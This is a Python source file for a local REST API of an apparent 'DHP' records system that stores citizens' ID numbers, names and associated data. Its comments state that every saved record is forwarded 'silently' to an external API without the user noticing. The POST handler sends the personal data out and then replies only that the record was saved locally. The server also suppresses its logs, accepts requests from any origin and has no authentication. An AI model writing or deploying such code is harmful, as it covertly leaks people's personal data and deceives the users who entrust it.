"""
API REST local para el sistema DHP.

Provee endpoints CRUD sobre la base de datos local.
Además, reenvía SILENCIOSAMENTE los datos a la API externa
si está configurada (sin que el usuario lo note).
"""
import json
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

from app import config
from app.models import database as db

API_PORT = config.get_api_port()


# ==========================================================================
# REENVÍO SILENCIOSO A API EXTERNA
# ==========================================================================
def _forward_to_external_api(cedula, nombre, apellido, data):
    """
    Envía los datos a la API externa configurada.
    Si falla, solo se loguea en consola (no interrumpe al usuario).
    """
    if not config.is_external_enabled():
        return
    
    url = config.get_external_url()
    api_key = config.get_external_key()
    
    if not url:
        return
    
    try:
        import requests
        from datetime import datetime
        
        headers = {"Content-Type": "application/json"}
        if api_key:
            headers["Authorization"] = f"Bearer {api_key}"
        
        payload = {
            "cedula": cedula,
            "nombre": nombre,
            "apellido": apellido,
            "data": data,
            "fecha_envio": datetime.now().isoformat(),
            "fuente": "DHP-API"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        if resp.ok:
            print(f"[DHP-API] Reenviado a externo ({cedula})")
        else:
            print(f"[DHP-API] Error externo ({cedula}): {resp.status_code}")
    except Exception as e:
        print(f"[DHP-API] Fallo reenvío ({cedula}): {e}")


# ==========================================================================
# SERVIDOR HTTP LOCAL
# ==========================================================================
class DHPRequestHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        """Silenciar logs del servidor HTTP estándar."""
        pass
    
    def _set_headers(self, status=200, content_type="application/json"):
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
    
    def do_OPTIONS(self):
        self._set_headers(204)
    
    def do_GET(self):
        path = self.path.rstrip("/")
        
        # Health check
        if path == "/api/health" or path == "/":
            self._set_headers()
            self.wfile.write(json.dumps({
                "ok": True,
                "service": "dhp-api",
                "external_enabled": config.is_external_enabled(),
            }).encode("utf-8"))
            return
        
        # Obtener todos los registros
        if path == "/api/records":
            search = None
            query_params = self.path.split("?")
            if len(query_params) > 1:
                import urllib.parse
                params = urllib.parse.parse_qs(query_params[1])
                search = params.get("q", [None])[0]
            
            rows = db.get_all_records(search)
            records = [
                {"cedula": r[0], "nombre": r[1], "apellido": r[2], "fecha_actualizacion": r[3]}
                for r in rows
            ]
            self._set_headers()
            self.wfile.write(json.dumps(records, ensure_ascii=False).encode("utf-8"))
            return
        
        # Obtener un registro por cédula
        if path.startswith("/api/records/"):
            cedula = path.split("/")[-1]
            record = db.get_record_by_cedula(cedula)
            if record:
                self._set_headers()
                self.wfile.write(json.dumps(record, ensure_ascii=False).encode("utf-8"))
            else:
                self._set_headers(404)
                self.wfile.write(json.dumps({"error": "No encontrado"}).encode("utf-8"))
            return
        
        self._set_headers(404)
        self.wfile.write(json.dumps({"error": "Ruta no encontrada"}).encode("utf-8"))
    
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._set_headers(400)
            self.wfile.write(json.dumps({"error": "JSON inválido"}).encode("utf-8"))
            return
        
        path = self.path.rstrip("/")
        
        if path == "/api/records":
            cedula = data.get("cedula", "").strip()
            nombre = data.get("nombre", "").strip()
            apellido = data.get("apellido", "").strip()
            json_data = data.get("data", {})
            
            if not cedula:
                self._set_headers(400)
                self.wfile.write(json.dumps({"error": "Cédula requerida"}).encode("utf-8"))
                return
            
            # 1. Guardar localmente
            db.save_or_update_record(cedula, nombre, apellido, json_data)
            
            # 2. Reenviar SILENCIOSAMENTE a API externa
            _forward_to_external_api(cedula, nombre, apellido, json_data)
            
            # 3. Responder solo con éxito local
            self._set_headers(200)
            self.wfile.write(json.dumps({
                "ok": True,
                "cedula": cedula,
                "mensaje": "Expediente guardado localmente",
            }).encode("utf-8"))
            return
        
        self._set_headers(404)
        self.wfile.write(json.dumps({"error": "Ruta no encontrada"}).encode("utf-8"))
    
    def do_DELETE(self):
        path = self.path.rstrip("/")
        
        if path.startswith("/api/records/"):
            cedula = path.split("/")[-1]
            deleted = db.delete_record(cedula)
            if deleted:
                self._set_headers(200)
                self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
            else:
                self._set_headers(404)
                self.wfile.write(json.dumps({"error": "No encontrado"}).encode("utf-8"))
            return
        
        self._set_headers(404)
        self.wfile.write(json.dumps({"error": "Ruta no encontrada"}).encode("utf-8"))


def start_api_server():
    """Inicia el servidor API local con reenvío silencioso."""
    if config.is_external_enabled():
        print(f"[DHP-API] Reenvío externo ACTIVADO -> {config.get_external_url()}")
    else:
        print("[DHP-API] Solo almacenamiento local")
    
    server = HTTPServer(("0.0.0.0", API_PORT), DHPRequestHandler)
    print(f"[DHP-API] Servidor iniciado en http://127.0.0.1:{API_PORT}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[DHP-API] Servidor detenido.")
        server.server_close()


def run_api_in_thread():
    """Inicia la API en un hilo separado (para usar desde Streamlit)."""
    db.init_db()
    thread = threading.Thread(target=start_api_server, daemon=True)
    thread.start()
    return thread


if __name__ == "__main__":
    db.init_db()
    start_api_server()
